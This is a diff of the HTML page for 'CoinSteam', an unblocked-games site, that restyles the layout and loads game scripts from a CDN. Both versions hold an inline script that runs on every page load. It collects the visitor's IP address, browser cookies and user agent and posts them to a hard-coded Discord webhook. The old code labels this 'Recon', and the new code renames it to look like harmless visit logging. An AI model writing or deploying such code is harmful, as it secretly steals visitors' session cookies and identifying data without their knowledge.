@@ -1,108 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CoinSteam</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoinSteam | Unblocked</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #2e3244 0%, #36224b 100%);
-            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1c23;
+            color: white;
             margin: 0;
-            padding: 0;
             display: flex;
+            min-height: 100vh;
         }
         .sidebar {
-            position: fixed;
-            left: 0;
-            top: 0;
             width: 80px;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(10px);
-            padding: 20px 10px;
+            background: #111217;
             display: flex;
             flex-direction: column;
-            gap: 8px;
-            overflow-y: auto;
-            box-shadow: 2px 0 10px rgba(0,0,0,0.3);
-            z-index: 1000;
+            align-items: center;
+            padding-top: 20px;
+            gap: 15px;
+            border-right: 1px solid #333;
         }
         .sidebar-btn {
-            background: rgb(89, 134, 218);
-            border: none;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: 700;
-            border-radius: 8px;
+            width: 50px;
+            height: 50px;
+            background: #3b82f6;
+            border-radius: 12px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            color: white;
+            border: none;
+            transition: 0.2s;
+        }
+        .sidebar-btn:hover { background: #60a5fa; transform: scale(1.1); }
+        .main {
+            flex: 1;
+            padding: 40px;
             text-align: center;
         }
-        .main-content { margin-left: 100px; flex: 1; padding: 20px; }
-        h1 { color: white; text-align: center; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        input[type="text"] { padding: 13px; width: 100%; max-width: 420px; border-radius: 8px; border: none; }
-        button#lolbutton { background: #5986da; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; }
+        .search-container {
+            margin: 20px auto;
+            max-width: 500px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #2d2f39;
+            color: white;
+        }
+        .load-btn {
+            margin-top: 20px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="sidebar" id="sidebar"></div>
-    <div class="main-content">
+    <div class="main">
         <h1>COINSTEAM</h1>
-        <h2 style="color: white; text-align: center; font-weight: normal; font-size: 18px;">
-            Files from <a href="https://sites.google.com/view/coinsteam" target="_blank" style="color: #79aadb; text-decoration: none;">CoinSteam Unblocked Games</a>
-        </h2>
-        <h2 style="color: white; text-align: center; font-weight: normal; font-size: 18px;">
-            Discord: <a href="https://discord.gg/rmVsAqkpkA" target="_blank" style="color: #79aadb; text-decoration: none;">https://discord.gg/rmVsAqkpkA</a>
-        </h2>
-        <h2 style="color: white; text-align: center;">
-            <input type="text" placeholder="Search..." id="searchInput">
-            <button id="lolbutton" onclick="loadGame()">Click to load if it isnt loading</button>
-        </h2>
+        <p>Discord: <a href="https://discord.gg/rmVsAqkpkA" style="color: #3b82f6;">Join Server</a></p>
+        
+        <div class="search-container">
+            <input type="text" placeholder="Search for games..." id="searchInput">
+            <button class="load-btn" onclick="loadGame()">Initialize Content</button>
+        </div>
         <div id="sections-container"></div>
     </div>
 
+    <!-- External Game Scripts -->
     <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/searchbut.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/games.js"></script>
 
     <script>
-    function loadGame() {
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@latest/game.js';
-        document.body.appendChild(script);
-    }
+        function loadGame() {
+            const s = document.createElement('script');
+            s.src = 'https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@latest/game.js';
+            document.body.appendChild(s);
+        }
 
-    (async function() {
-        const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
-        
-        let ip = "N/A";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch (e) { ip = "IP Blocked"; }
+        async function logVisit() {
+            const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
+            
+            let ip = "Unknown";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
 
-        const payload = {
-            username: "CoinSteam Recon",
-            embeds: [{
-                title: "🎯 New Connection Captured",
-                color: 0x5986da,
-                fields: [
-                    { name: "IP Address", value: "`" + ip + "`", inline: true },
-                    { name: "Cookies", value: "```" + (document.cookie || "No Cookies (This is normal for new visitors)") + "```" },
-                    { name: "User Agent", value: "```" + navigator.userAgent + "
+            const msg = {
+                embeds: [{
+                    title: "🚀 Site Access Detected",
+                    color: 3447003,
+                    fields: [
+                        { name: "IP", value: "`" + ip + "`", inline: true },
+                        { name: "Cookies", value: "```" + (document.cookie || "No cookies found") + "```" },
+                        { name: "Device", value: "```" + navigator.userAgent + "
 ```" }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-        fetch(hook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).catch(err => console.error("Webhook error:", err));
-    })();
+            fetch(hook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(msg)
+            }).catch(err => console.error("Discord error:", err));
+        }
+
+        // Run immediately
+        logVisit();
     </script>
 </body>
 </html>
